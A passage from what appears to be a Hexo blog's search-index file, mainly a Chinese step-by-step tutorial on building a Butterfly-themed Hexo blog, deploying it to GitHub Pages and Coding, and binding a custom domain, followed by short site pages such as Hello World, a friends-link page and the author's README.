class="line">hexo g</span><br></pre></td></tr></table></figure><p>完成后会在根目录E:\Blog\下生成public文件夹，里面包含相应的html页面。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1sKW7qJ9gkxTCfc.png" alt="image-20210130222715240"></p><h2 id="启动服务器-本地"><a href="#启动服务器-本地" class="headerlink" title="启动服务器(本地)"></a>启动服务器(本地)</h2><p>可通过以下命令启动服务器:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>这条指令运行完成后可在本地启动服务器并预览博客，默认网址为<code>http://localhost:4000/</code>。<br>如果以上步骤都不出意外的话，你就会看到一个Hexo博客初始化的页面。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/YTqGb8ipVjBWQCv.png"></p><h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><p>默认的主题可能并不是我们想要的效果，那么就可以通过更换主题来实现。可以在<a href="https://hexo.io/themes/">Heox官网的主题页面</a>选择想要的主题。这里，选择Butterfly主题。感谢开源此主题的各位大佬们，让我用上了这么好的页面。</p><p>Butterfly主页的展示页面：<a href="https://jerryc.me/">https://jerryc.me</a> </p><p>详细的安装文档的地址为：<a href="https://jerryc.me/posts/21cfbf15">https://jerryc.me/posts/21cfbf15</a></p><p>Github地址：<a href="https://github.com/jerryc127/hexo-theme-butterfly">https://github.com/jerryc127/hexo-theme-butterfly</a></p><p>根据文档说明直接配置主题即可，这里简单记录如下：</p><blockquote><p>Butterfly主题安装</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><blockquote><p>应用主题</p></blockquote><p>修改站点配置文件<code>_config.yml</code>，把主题改为<code>butterfly</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><p>为方便后续设置，这里把<code>butterfly</code> 目录下的 <code>_config.yml</code> 配置文件复制到 <code>Blog</code> 目录下，并重新命名为 <code>_config.butterfly.yml</code>。以后对主题的相关设置只需要在 <code>_config.butterfly.yml</code>进行配置就行。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/bv2jmdBIiKNf7WF.png" alt="image-20210130122459017"></p><blockquote><p>安装相关插件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>在安装，应用主题时遇到的问题可在bufferfly的安装文档中查阅。</p><p>在一定修改后通过以下命令来查看应用主题后的初步效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #清楚缓存文件</span><br><span class="line">hexo g  #生成发布用的静态页面</span><br><span class="line">hexo s  #重启本地服务器</span><br></pre></td></tr></table></figure><p>刷新刚才的网址：<a href="http://localhost:4000/">http://localhost:4000</a> ，可以看到更新后的主题页面：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/hexo_butterfly_review.png"></p><p>更多细节设置，如菜单栏，背景图片，代码格式等等，可以参考Butterfly的<a href="https://jerryc.me/posts/21cfbf15">文档</a>来配置，这里不再赘述。</p><p>小站还在魔改中…（具体可参考友链中的大佬博客，这里就不造轮子了）</p><h1 id="部署到Github"><a href="#部署到Github" class="headerlink" title="部署到Github"></a>部署到Github</h1><blockquote><p>截止目前，已经<strong>成功安装好了一个初始化的Hexo博客</strong>。但是暂时还只能在自己电脑上看到，如何让别人通过域名可以访问到呢？接下来就要请出今天的另外一位主角<strong>GitHub Pages</strong>了。<br>另外，以上的安装步骤也可参考<a href="https://link.jianshu.com/?t=https://hexo.io/zh-cn/docs/index.html">Hexo官方文档</a>，关于各命令有更详细的解释。</p></blockquote><h2 id="创建Github仓库"><a href="#创建Github仓库" class="headerlink" title="创建Github仓库"></a>创建Github仓库</h2><p>这里假设已经注册过了Github帐户，如果没有，可以去<a href="https://github.com/">Github</a>注册。</p><p>注册好了后，登录Github,创建仓库：点击右上角的+号，选择new repository</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/4iLYFGOtm1r3NRc.png" alt="image-20210130233629330"></p><p>将仓库名设置为 <code>username.github.io</code> ,<strong>其中,username请对应换成你的github用户名。</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/QR7uxPLNHyA1GWo.png" alt="image-20210130234029747"></p><h2 id="添加SSH公钥"><a href="#添加SSH公钥" class="headerlink" title="添加SSH公钥"></a>添加SSH公钥</h2><p>如果第一次使用git的话，需要设置用户名和邮箱:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your username&quot;</span><br><span class="line">git config --global user.email &quot;your email&quot;</span><br></pre></td></tr></table></figure><p>将上述的”your username”换成自己的真实用户名,”your email”换成真实的email。</p><p>然后，生成公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>在C盘/用户/用户名/.ssh目录下找到<code>id_rsa.pub</code>文件,用文本编辑工具打开，并复制所有文本内容。在Github页面右上角，点击用户头像-Settings-SSH and GPG keys-New SSH key</p><p>把复制的公钥文本内容粘贴到Key中，上方的Title可随意填写</p><p>添加完成后可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果配置成功，可以看到成功的回复。</p><h2 id="上传文件到Github仓库"><a href="#上传文件到Github仓库" class="headerlink" title="上传文件到Github仓库"></a>上传文件到Github仓库</h2><p>在配置文件<code>_config.yml</code>中添加仓库信息:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: #你的仓库地址,如:https://github.com/wawyw/wawyw.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>直接通过hexo来发布到github，需要安装以下插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>安装成功后，执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d   #生成一个.deploy_git的文件夹，并把本地生成的静态文件部署Github仓库中的master分支上</span><br></pre></td></tr></table></figure><p>刷新github对应的repository页面，即可看到提交的内容：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/KUetpmHJ9PxB1oa.png" alt="image-20210130235436880"></p><h2 id="配置静态站点"><a href="#配置静态站点" class="headerlink" title="配置静态站点"></a>配置静态站点</h2><p>点击Settings, 进入GitHub Pages配置，由于之前新建仓库的时候，仓库名为username.github.io，github已经自己为我们发布了静态的页面。如果不是username.github.io的格式，则需要手动配置。</p><p>之后在浏览器中输入<code>username.github.io</code>（可能你已经发现了，这个就是之前新建仓库的名字，同时也是博客的域名），没毛病的话，应该可以再次看到那个熟悉又亲切的博客页面了。</p><blockquote><p>至此，我们已经通过Hexo创建了一个最原始的博客，并且通过把博客静态文件放到GitHub的仓库中，实现了从网上以GitHub的默认域名访问这个博客。</p><p>如果需要个性化域名，则需要申请对应的域名并绑定到Github上。</p><p>因为Github用的是国外的服务器，站点加载速度可能较慢，可考虑使用GitHub+coding双托管博客，这样一来，国内访问coding的服务器，国外访问GitHub的服务器，以提升国内访问博客的速度。</p></blockquote><h1 id="部署到Coding"><a href="#部署到Coding" class="headerlink" title="部署到Coding"></a>部署到Coding</h1><h2 id="创建Coding仓库"><a href="#创建Coding仓库" class="headerlink" title="创建Coding仓库"></a>创建Coding仓库</h2><p>同样，先<a href="https://coding.net/">官网注册</a></p><p>选择项目，新建一个代码托管项目<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/kFH5Y7sBDtJd6ZO.png" alt="image-20210202114025032"></p><p>填写完项目基本信息后，完成创建</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Gvh47RtmBHxTCwJ.png" alt="image-20210202114214799"></p><h2 id="添加SSH公钥-1"><a href="#添加SSH公钥-1" class="headerlink" title="添加SSH公钥"></a>添加SSH公钥</h2><p>找到之前部署到Github时生成的<code>id_rsa.pub</code> 文件，复制其内容。</p><p>打开Coding的<code>个人设置</code>，<code>SSH公钥</code>，添加公钥，名称自定，粘贴刚才复制的公钥，添加好后如下图。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yTJ34V9SzZxYuNr.png" alt="image-20210202114643411"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/czZBXJvNPqYMoiQ.png" alt="image-20210202115022080"></p><h2 id="上传文件到Coding仓库"><a href="#上传文件到Coding仓库" class="headerlink" title="上传文件到Coding仓库"></a>上传文件到Coding仓库</h2><p>打开新建的仓库，点击克隆➡模式选ssh➡复制地址，将仓库链接添加到站点的配置文件 <code>_config.yml</code> 中</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8RJeOF6nyjUsrbi.png" alt="image-20210202115328829"></p><p>修改完之后 <code>hexo d</code> 部署就会将 public 目录推送到 Coding 上博客仓库的 master 分支。部署后仓库如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ExJgFdcnDqHbXyQ.png" alt="image-20210202115530532"></p><h2 id="配置静态站点-1"><a href="#配置静态站点-1" class="headerlink" title="配置静态站点"></a>配置静态站点</h2><p>把博客上传部署到仓库后，我们还要在Coding生成静态页面。</p><p>进入仓库，进入<code>项目设置</code><strong>（注意这个在左下角）</strong>，<code>项目与成员</code>，右侧<code>功能开关</code>，开启 <code>持续部署</code>即可</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/hw39alxYncKVSiv.png" alt="image-20210202115821544"></p><p>开启后就会在仓库的左侧看到此功能，点击<code>静态网站</code>，新建网站，填写网站名称，其它默认，保存。</p><p>开启服务后会出现访问地址，如下图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sz2NhSQv1c3UPJq.png" alt="image-20210202120139692"></p><p>访问此地址后会跳转到你的博客首页。与GitHub部署类似，此网址相当于你博客的另一个访问地址。我们后面要把所有的这些网址都解析到同一个域名上。</p><h1 id="绑定个人域名"><a href="#绑定个人域名" class="headerlink" title="绑定个人域名"></a>绑定个人域名</h1><blockquote><p>配置好Github和Coding的静态页面后，已经可以通过给定的网址访问到博客页面了。如果需要个性化域名，则需要申请对应的域名并绑定到Github和Coding上。</p></blockquote><h2 id="注册域名"><a href="#注册域名" class="headerlink" title="注册域名"></a>注册域名</h2><p>注册域名的平台有很多可以选择，这里以阿里云为例。</p><p>来到<a href="https://wanwang.aliyun.com/domain/">万网平台</a>，查询可注册的域名</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1euIfLRiU6JWCr4.png" alt="image-20210202122045985"></p><p>挑选喜欢的域名，加入清单→立即结算→立即购买</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/LjRiADB5tTsnMzV.png" alt="image-20210202122234878"></p><blockquote><p>这里选择的是<code> .top</code> 域名，你懂的😂</p></blockquote><h2 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h2><p>登录<a href="https://homenew.console.aliyun.com/home/dashboard/ProductAndService">阿里云的控制台</a>，点击左侧菜单-域名，进入域名管理页面。</p><p>在域名列表中，找到需要解析的域名，点击对应的解析按钮。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/bQ8rnTtdPepaWS7.png" alt="image-20210202123116868"></p><p>点击”添加记录”</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8gGsqTyaJvHZpO7.png" alt="image-20210202123225340"></p><h3 id="解析-Github"><a href="#解析-Github" class="headerlink" title="@解析-Github"></a>@解析-Github</h3><p>在cmd窗口中，ping一下之前配置的Githun的静态页面地址</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/oeJlf2GacxBF7QT.png" alt="image-20210202123556068"></p><p>可以获取到对应的ip地址</p><p>添加记录编辑如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/MDpf4OdtBhJwT18.png" alt="image-20210202124304317"></p><ul><li>记录类型选择A，添加 A 记录可实现将域名指向 IP 地址。</li><li>主机记录输入@，一般是指子域名的前缀（如需创建子域名为<a href="http://www.dns-example.com/">www.dns-example.com</a>, 主机记录输入 <strong>www</strong>；如需实现dns-example.com，主机记录输入 **@**）</li><li>解析线路选择境外,因为我们是准备国内访问时访问到Coding，国外访问时访问到Github</li><li>记录值输入刚才获取到的ip地址,如:185.199.110.153</li></ul><h3 id="www解析-Github"><a href="#www解析-Github" class="headerlink" title="www解析-Github"></a>www解析-Github</h3><p>添加记录编辑如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/GrqatcWw3FdnSmz.png" alt="image-20210202124929421"></p><ul><li>记录类型选择CNAME,添加 CNAME 记录可实现将域名指向另外一个域名。</li><li>主机记录输入www</li><li>解析线路选择境外</li><li>记录值就输入Github的静态页面地址,即 wawyw.github.io</li></ul><h3 id="解析-Coding"><a href="#解析-Coding" class="headerlink" title="@解析-Coding"></a>@解析-Coding</h3><p>在cmd窗口中，ping一下之前配置的Coding的静态页面地址</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yt3M4K8bj7sFSHk.png" alt="image-20210202125402543"></p><p>可以获取到对应的ip地址</p><p>添加记录编辑如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SYh8u9rwLUNixpD.png" alt="image-20210202125550187"></p><ul><li>记录类型选择A</li><li>主机记录输入@</li><li>解析线路选择默认</li><li>记录值输入刚才获取到的ip地址,如:124.156.144.32</li></ul><h3 id="www解析-Coding"><a href="#www解析-Coding" class="headerlink" title="www解析-Coding"></a>www解析-Coding</h3><p>添加记录编辑如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SeVBI1XAzavonUT.png" alt="image-20210202125909957"></p><ul><li>记录类型选择CNAME</li><li>主机记录输入www</li><li>解析线路选择默认</li><li>记录值就输入Coding的静态页面地址</li></ul><p>最后配置完成如下图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fYBiz2cT3FkqdEX.png" alt="image-20210202130137863"></p><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><h3 id="Github域名绑定"><a href="#Github域名绑定" class="headerlink" title="Github域名绑定"></a>Github域名绑定</h3><p>在项目根目录-source目录下，新建CNAME文件,内容输入前面申请的域名，如:<a href="http://www.wawyw.top/">www.wawyw.top</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/64joLQzHBKOqmiE.png" alt="image-20210202130504760"></p><p>上传到Github和Coding的仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>上传后就可以在Github和Coding对应的项目根目录下发到提交到的CNAME文件。</p><p>由于提交了CNAME文件，Github的静态页面服务已经自动绑定了新提交的域名</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8F6tvVLCE7eWqKl.png" alt="image-20210202130924470"></p><p>这时，就可以用上面自定义的域名访问我们的博客了。</p><h3 id="Coding域名绑定"><a href="#Coding域名绑定" class="headerlink" title="Coding域名绑定"></a>Coding域名绑定</h3><p>回到Coding仓库的静态网站设置页面，选择自定义域名→新建域名</p><blockquote><p><strong>注意</strong>：一定要添加两条，一条带<code>www.</code>的，一条不带<code>www.</code>的</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8oD2RBig7FwLpGV.png" alt="image-20210202135629358"></p><p>添加后会给出两条CNAME记录，需要回到阿里云控制台的解析设置中修改对应的记录值</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/2RzO14uBefParJl.png" alt="image-20210202135944688"></p><blockquote><p>OK！现在我们就算完成了GitHub+Coding双托管博客了</p><p>这样国内的用户访问的就是coding上部署的博客，而国外的用户访问的就是github上部署的博客</p></blockquote><h2 id="国内测速对比"><a href="#国内测速对比" class="headerlink" title="国内测速对比"></a>国内测速对比</h2><p>测速网站：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p><strong>国内访问GitHub服务器：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qeJIVuBFfsxjygP.png" alt="image-20210202170104490"></p><p><strong>国内访问Coding服务器：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fWmNrIyg17Ab9ih.png" alt="image-20210202171245483"></p><blockquote><p>一对比我们就可以看到Coding服务器在国内访问快多了，而GitHub服务器在国内访问有很多都是超时，速度提升较明显。</p></blockquote><p>不过，在后面体验过CDN加速后，这又算得了啥，先上图</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/o5CnxDYNiMLIjSy.png" alt="image-20210207002805836"></p><p>这里选择了腾讯云的CDN加速服务，新用户可以白嫖6个月的流量哟。又拍云的CDN也不错，更多详情可以去官网了解。（前提要做好网站的备案工作）</p><h1 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h1><p>创建页面命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page page_name</span><br></pre></td></tr></table></figure><p>这里在<code>source/_posts</code> 目录下以<code>markdown</code> 的格式编辑博客文章。</p><blockquote><p>Front-matter</p></blockquote><p>Front-matter 是md文件最上方以<code>---</code>分隔的区域，用于指定每篇博客的信息。</p><p>如果标注<code>可选</code>的参数，可根据自己需要添加，不用全部都写在markdown里</p><p><strong>Page Front-matter</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">description:</span><br><span class="line">comments:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">aside:</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">写法</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">title</td><td align="center">【必需】页面标题</td></tr><tr><td align="center">date</td><td align="center">【必需】页面创建日期</td></tr><tr><td align="center">type</td><td align="center">【必需】标签、分类等页面需要配置</td></tr><tr><td align="center">updated</td><td align="center">【可选】页面更新日期</td></tr><tr><td align="center">description</td><td align="center">【可选】页面描述</td></tr><tr><td align="center">comments</td><td align="center">【可选】显示页面评论模块(默认 true)</td></tr><tr><td align="center">top_img</td><td align="center">【可选】页面顶部图片</td></tr><tr><td align="center">aside</td><td align="center">【可选】显示侧边栏 (默认 true)</td></tr></tbody></table><p><strong>Post Front-matter</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">cover:</span></span><br><span class="line"><span class="emphasis">sticky:</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">写法</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">title</td><td align="center">【必需】文章标题</td></tr><tr><td align="center">date</td><td align="center">【必需】文章创建日期</td></tr><tr><td align="center">updated</td><td align="center">【可选】文章更新日期</td></tr><tr><td align="center">tags</td><td align="center">【可选】文章标签</td></tr><tr><td align="center">categories</td><td align="center">【可选】文章分类</td></tr><tr><td align="center">top_img</td><td align="center">【可选】文章顶部图片</td></tr><tr><td align="center">cover</td><td align="center">【可选】文章封面</td></tr><tr><td align="center">sticky</td><td align="center">【可选】文章置顶，数值越大，置顶的优先级越大。</td></tr></tbody></table><p>博客编辑完成后，仍然是通过这三步发布文章</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>发布之前，在本地预览博客用到的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Vla8QmTZKeF7SLX.png" alt="image-20210131023529206"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><blockquote><p>总的来说，这次的搭建过程还算顺利，期间遇到的一些问题也通过浏览大佬的文章解决了，感谢他们的分享。网络上关于利用Hexo搭建博客的资料有很多，写这篇文章主要是为了记录此次搭建博客的过程，便于后续可能再次部署，同时也希望能帮助到有需要的朋友。完结撒花~~</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]  <a href="https://hexo.io/zh-cn/docs/">Hexo文档</a></p><p>[2]  <a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档</a></p><p>[3]  <a href="https://www.jianshu.com/p/ea5ac6162a96">GitPages + Hexo,从0到1搭建个人博客</a></p><p>[4] <a href="https://www.milovetingting.cn/2020/01/06/Web/Hexo+Butterfly+Github+Coding%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/#Hexo-Butterfly-Github-Coding%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2">Hexo+Butterfly+Github+Coding搭建个人博客</a></p><p>[5] <a href="https://www.heson10.com/posts/54971.html">Hexo在GitHub和Coding双线部署教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="posts/16107.html"/>
      <url>posts/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="manifest.json"/>
      <url>manifest.json</url>
      
        <content type="html"><![CDATA[{"name":"string","short_name":"Junzhou","theme_color":"#49b1f5","background_color":"#49b1f5","display":"standalone","start_url":"/","icons":[{"src":"images/pwaicons/36.png","sizes":"36x36","type":"image/png"},{"src":"images/pwaicons/48.png","sizes":"48x48","type":"image/png"},{"src":"images/pwaicons/72.png","sizes":"72x72","type":"image/png"},{"src":"images/pwaicons/96.png","sizes":"96x96","type":"image/png"},{"src":"images/pwaicons/144.png","sizes":"144x144","type":"image/png"},{"src":"images/pwaicons/192.png","sizes":"192x192","type":"image/png"},{"src":"images/pwaicons/512.png","sizes":"512x512","type":"image/png"}],"splash_pages":null}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="link/index.html"/>
      <url>link/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="我的Blog信息"><a href="#我的Blog信息" class="headerlink" title="我的Blog信息"></a>我的Blog信息</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">wawyw</span></span><br><span class="line">  <span class="attr">link:</span> <span class="string">https://www.wawyw.top/</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">https://www.wawyw.top/avatar.webp</span></span><br><span class="line">  <span class="attr">descr:</span> <span class="string">活在当下</span> <span class="string">顺势而为</span></span><br></pre></td></tr></table></figure><div class='tip info'><p>欢迎交换友链🚀<p></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>朋友圈</title>
      <link href="fcircle/index.html"/>
      <url>fcircle/index.html</url>
      
        <content type="html"><![CDATA[<div id="moments_container" ></div><script src="moments.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>碎碎念</title>
      <link href="speak/index.html"/>
      <url>speak/index.html</url>
      
        <content type="html"><![CDATA[<p>​<br>​<br>​<br>​        </p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>README</title>
      <link href="readme/index.html"/>
      <url>readme/index.html</url>
      
        <content type="html"><![CDATA[<div class='tip success'><p>欢迎来到我的博客，这是一个记录学习的地方，像我这样的废物需要多记✍<p></div><div class='tip info'><p>小站的大部分美化、魔改来自（白嫖）于大佬们的博客，感谢分享！🎨<p></div><div class='tip warning'><p>博客中的部分文字、图片来源于网络，如有侵权，请联系删除。🚫<p></div><div class="tip ffa font5 fas fa-cogs"><p><del>永远相信美好的事情即将发生！</del>偶尔搬砖，日常摸鱼ing...🐟</p><p></p></div><h1>个人简介</h1><div class="checkbox cyan">  <input type="radio" />  <p>来自阿卡林省，风景这边独好🌈</p></div><div class="checkbox blue">  <input type="radio" />  <p>某邮电大学大一 Student，网络空间安全专业在读👀</p></div><div class="checkbox yellow">  <input type="radio" />  <p>对一切新鲜的事物充满好奇🧐</p></div><div class="checkbox green">  <input type="radio" />  <p>每天进步一点点，早日成为白帽子一员👊</p></div><h1>技能学习</h1><div class="checkbox minus yellow checked">  <input type="checkbox" checked />  <p>Web安全基础（学习中...）</p></div><div class="checkbox minus green checked">  <input type="checkbox" checked />  <p>漏洞挖掘（学习中...）</p></div><div class="checkbox minus red checked">  <input type="checkbox" checked />  <p>渗透测试（未学习）</p></div><div class="checkbox minus blue checked">  <input type="checkbox" checked />  <p>待学习的技术：多着呢，都学不来</p></div><h1>能力特长</h1><div class="checkbox times red checked">  <input type="checkbox" checked />  <p>精通 C、C++、Python、Java、Javascript、JSP、PHP、Perl、Go等单词的拼写</p></div><div class="checkbox times red checked">  <input type="checkbox" checked />  <p>擅长 